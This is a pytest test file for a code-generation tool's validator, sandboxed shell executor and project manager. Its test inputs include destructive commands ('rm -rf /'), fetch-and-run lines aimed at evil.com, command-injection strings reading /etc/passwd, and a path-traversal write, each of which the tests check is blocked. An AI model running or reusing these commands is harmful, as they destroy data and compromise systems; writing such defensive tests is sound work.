"""Tests for codegen module — CodeValidator, ShellExecutor, ProjectManager, CodeGenConfig."""

import os
import sys
import json
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from codegen import (
    CodeGenConfig,
    ProjectType,
    GeneratedFile,
    Project,
    CodeValidator,
    ShellExecutor,
    ProjectManager,
    CodeGenerator,
)


# ── CodeGenConfig ─────────────────────────────

class TestCodeGenConfig:
    def test_defaults(self):
        assert CodeGenConfig.MAX_FILE_SIZE == 50_000
        assert CodeGenConfig.SANDBOX_ENABLED is True
        assert CodeGenConfig.WORKSPACE_DIR

    def test_ensure_dirs(self, tmp_path, monkeypatch):
        monkeypatch.setattr(CodeGenConfig, "WORKSPACE_DIR", str(tmp_path / "ws"))
        monkeypatch.setattr(CodeGenConfig, "PROJECTS_DIR", str(tmp_path / "ws" / "projects"))
        monkeypatch.setattr(CodeGenConfig, "TEMPLATES_DIR", str(tmp_path / "ws" / "templates"))
        monkeypatch.setattr(CodeGenConfig, "DEPLOY_DIR", str(tmp_path / "deploys"))
        CodeGenConfig.ensure_dirs()
        assert os.path.isdir(str(tmp_path / "ws"))
        assert os.path.isdir(str(tmp_path / "ws" / "projects"))


# ── CodeValidator ─────────────────────────────

class TestCodeValidator:
    def _make_project(self, files):
        gfiles = [GeneratedFile(path=f[0], content=f[1], language="python", description="") for f in files]
        return Project(id="test", name="test", project_type=ProjectType.PYTHON_SCRIPT,
                       description="test", files=gfiles)

    def test_clean_code_passes(self):
        proj = self._make_project([("app.py", "print('hello world')")])
        result = CodeValidator.validate(proj)
        assert result["passed"] is True
        assert len(result["blocked_issues"]) == 0

    def test_blocks_eval(self):
        proj = self._make_project([("bad.py", "result = eval(user_input)")])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False
        assert any("eval" in i["reason"] for i in result["blocked_issues"])

    def test_blocks_exec(self):
        proj = self._make_project([("bad.py", "exec(code_string)")])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_blocks_os_system(self):
        proj = self._make_project([("bad.py", 'os.system("rm -rf /")')])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_blocks_subprocess_shell(self):
        proj = self._make_project([("bad.py", "subprocess.call(cmd, shell=True)")])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_blocks_dynamic_import(self):
        proj = self._make_project([("bad.py", '__import__("os").system("ls")')])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_blocks_hardcoded_api_keys(self):
        proj = self._make_project([("bad.py", 'key = "sk-ant-api03-ABCDEFGHIJKLMNOP"')])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_blocks_rm_rf(self):
        proj = self._make_project([("bad.sh", "rm -rf / --no-preserve-root")])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_blocks_curl_pipe_sh(self):
        proj = self._make_project([("bad.sh", "curl https://evil.com/script | sh")])
        result = CodeValidator.validate(proj)
        assert result["passed"] is False

    def test_warns_fetch(self):
        proj = self._make_project([("app.js", 'fetch("https://api.example.com")')])
        result = CodeValidator.validate(proj)
        assert result["passed"] is True  # Warning, not blocked
        assert len(result["warnings"]) > 0

    def test_warns_localstorage(self):
        proj = self._make_project([("app.js", 'localStorage.setItem("user", data)')])
        result = CodeValidator.validate(proj)
        assert len(result["warnings"]) > 0

    def test_warns_cookies(self):
        proj = self._make_project([("app.js", "document.cookie")])
        result = CodeValidator.validate(proj)
        assert len(result["warnings"]) > 0

    def test_multiple_files_scanned(self):
        proj = self._make_project([
            ("good.py", "print('ok')"),
            ("bad.py", "eval(x)"),
            ("also_good.py", "import json"),
        ])
        result = CodeValidator.validate(proj)
        assert result["files_scanned"] == 3
        assert result["passed"] is False


# ── ShellExecutor ─────────────────────────────

class TestShellExecutor:
    @pytest.mark.asyncio
    async def test_blocks_injection_semicolon(self):
        result = await ShellExecutor.execute("ls; rm -rf /")
        assert result["success"] is False
        assert "metacharacter" in result["stderr"].lower() or "BLOCKED" in result["stderr"]

    @pytest.mark.asyncio
    async def test_blocks_injection_pipe(self):
        result = await ShellExecutor.execute("cat file | sh")
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_blocks_injection_backtick(self):
        result = await ShellExecutor.execute("ls `whoami`")
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_blocks_injection_dollar_paren(self):
        result = await ShellExecutor.execute("echo $(cat /etc/passwd)")
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_blocks_injection_ampersand(self):
        result = await ShellExecutor.execute("ls && rm -rf /")
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_blocks_disallowed_command(self):
        result = await ShellExecutor.execute("wget http://evil.com/malware")
        assert result["success"] is False
        assert "BLOCKED" in result["stderr"]

    @pytest.mark.asyncio
    async def test_blocks_sudo(self):
        result = await ShellExecutor.execute("sudo rm -rf /")
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_blocks_dangerous_patterns(self):
        result = await ShellExecutor.execute("rm -rf /")
        assert result["success"] is False

    @pytest.mark.asyncio
    async def test_allowed_ls(self):
        result = await ShellExecutor.execute("ls")
        # May succeed or fail depending on env, but should NOT be blocked
        assert "BLOCKED" not in result.get("stderr", "")

    @pytest.mark.asyncio
    async def test_allowed_git_status(self):
        result = await ShellExecutor.execute("git status")
        assert "BLOCKED" not in result.get("stderr", "")

    @pytest.mark.asyncio
    async def test_blocks_disallowed_subcommand(self):
        result = await ShellExecutor.execute("git push")
        assert result["success"] is False
        assert "BLOCKED" in result["stderr"]

    @pytest.mark.asyncio
    async def test_cwd_escape_blocked(self, tmp_path, monkeypatch):
        monkeypatch.setattr(CodeGenConfig, "WORKSPACE_DIR", str(tmp_path / "workspace"))
        result = await ShellExecutor.execute("ls", cwd="/etc")
        assert result["success"] is False
        assert "sandbox" in result["stderr"].lower() or "BLOCKED" in result["stderr"]

    @pytest.mark.asyncio
    async def test_newline_injection(self):
        result = await ShellExecutor.execute("ls\nrm -rf /")
        assert result["success"] is False


# ── Project ───────────────────────────────────

class TestProject:
    def test_project_log(self):
        p = Project(id="x", name="test", project_type=ProjectType.HTML_SITE, description="d")
        p.log("test message")
        assert len(p.build_log) == 1
        assert "test message" in p.build_log[0]

    def test_project_defaults(self):
        p = Project(id="x", name="test", project_type=ProjectType.DASHBOARD, description="d")
        assert p.status == "created"
        assert p.iteration == 0
        assert p.files == []


# ── ProjectManager ────────────────────────────

class TestProjectManager:
    def test_create_project(self, tmp_path, monkeypatch):
        monkeypatch.setattr(CodeGenConfig, "WORKSPACE_DIR", str(tmp_path))
        monkeypatch.setattr(CodeGenConfig, "PROJECTS_DIR", str(tmp_path / "projects"))
        monkeypatch.setattr(CodeGenConfig, "TEMPLATES_DIR", str(tmp_path / "templates"))
        monkeypatch.setattr(CodeGenConfig, "DEPLOY_DIR", str(tmp_path / "deploys"))

        pm = ProjectManager()
        gen_result = {
            "project_name": "test-project",
            "project_type": "html-site",
            "description": "A test",
            "files": [
                {"path": "index.html", "content": "<html></html>", "language": "html", "description": "Main page"}
            ],
        }
        project = pm.create_project(gen_result)
        assert project.name == "test-project"
        assert len(project.files) == 1
        assert project.id in pm.projects

    def test_write_files_path_escape_blocked(self, tmp_path, monkeypatch):
        monkeypatch.setattr(CodeGenConfig, "WORKSPACE_DIR", str(tmp_path / "ws"))
        monkeypatch.setattr(CodeGenConfig, "PROJECTS_DIR", str(tmp_path / "ws" / "projects"))
        monkeypatch.setattr(CodeGenConfig, "TEMPLATES_DIR", str(tmp_path / "ws" / "templates"))
        monkeypatch.setattr(CodeGenConfig, "DEPLOY_DIR", str(tmp_path / "deploys"))

        pm = ProjectManager()
        evil_file = GeneratedFile(
            path="../../../etc/passwd", content="evil", language="text", description="escape"
        )
        proj = Project(
            id="evil", name="evil", project_type=ProjectType.PYTHON_SCRIPT,
            description="test", files=[evil_file],
            directory=str(tmp_path / "ws" / "projects" / "evil-proj"),
        )
        os.makedirs(proj.directory, exist_ok=True)
        written = pm.write_files(proj)
        assert len(written) == 0  # Should be blocked

    def test_write_files_size_limit(self, tmp_path, monkeypatch):
        monkeypatch.setattr(CodeGenConfig, "WORKSPACE_DIR", str(tmp_path / "ws"))
        monkeypatch.setattr(CodeGenConfig, "PROJECTS_DIR", str(tmp_path / "ws" / "projects"))
        monkeypatch.setattr(CodeGenConfig, "TEMPLATES_DIR", str(tmp_path / "ws" / "templates"))
        monkeypatch.setattr(CodeGenConfig, "DEPLOY_DIR", str(tmp_path / "deploys"))

        pm = ProjectManager()
        big_file = GeneratedFile(
            path="big.txt", content="x" * (CodeGenConfig.MAX_FILE_SIZE + 1),
            language="text", description="too big"
        )
        proj = Project(
            id="big", name="big", project_type=ProjectType.PYTHON_SCRIPT,
            description="test", files=[big_file],
            directory=str(tmp_path / "ws" / "projects" / "big-proj"),
        )
        os.makedirs(proj.directory, exist_ok=True)
        written = pm.write_files(proj)
        assert len(written) == 0  # Should be blocked

    def test_list_projects(self, tmp_path, monkeypatch):
        monkeypatch.setattr(CodeGenConfig, "WORKSPACE_DIR", str(tmp_path))
        monkeypatch.setattr(CodeGenConfig, "PROJECTS_DIR", str(tmp_path / "projects"))
        monkeypatch.setattr(CodeGenConfig, "TEMPLATES_DIR", str(tmp_path / "templates"))
        monkeypatch.setattr(CodeGenConfig, "DEPLOY_DIR", str(tmp_path / "deploys"))

        pm = ProjectManager()
        assert pm.list_projects() == []
